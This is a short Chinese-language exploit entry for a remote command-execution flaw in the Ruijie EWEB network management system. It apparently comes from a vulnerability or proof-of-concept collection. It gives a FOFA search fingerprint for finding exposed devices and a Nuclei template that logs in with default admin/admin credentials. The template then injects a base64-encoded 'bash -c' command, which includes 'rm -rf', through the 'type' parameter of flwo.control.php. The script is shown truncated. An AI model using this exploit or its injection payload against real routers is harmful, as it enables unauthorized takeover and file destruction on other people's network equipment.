# Ruijie-EWEB网管系统rce

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="锐捷网络-EWEB网管系统"`
- **请求**：`POST /flow_control_pi/flwo.control.php?a=flowOpen HTTP/1.1`
- **关键头**：`Host: localhost:4430`　`Content-Length: 11`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`Cookie: user=21232f297a57a5a743894a0e4a801fc3; LOCAL_LANG_COOKIE=zh; UI_LOCAL_COOKIE=zh;…`　`X-Forwarded-For: x`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
Nuclei
id: ruijie-route-flwo-rce
info:
name: ruijie-route-flwo-rce
author: HackTwo
severity: high
description: 锐捷 EWEB路由器 flwo.control.php 存在rce漏洞。
tags:  ruijie,rce
metadata:
fofa-qeury: title="锐捷网络-EWEB网管系统"
http:
- raw:
-
POST /ddi/server/login.php HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
username=admin&password=admin?
-
POST /flow_control_pi/flwo.control.php?a=getFlowGroup HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID={{cookie}};user=admin;
type=%7Cbash+-c+%27echo+cm0gLXJmIC4uLzEyMzMyMXF3ZS50eHQgJiYgZWNobyBGMDhiYmZiMkJDOGNlZUQ2ID4gLi4…（脚本共 1121 字，完整版见原文）
```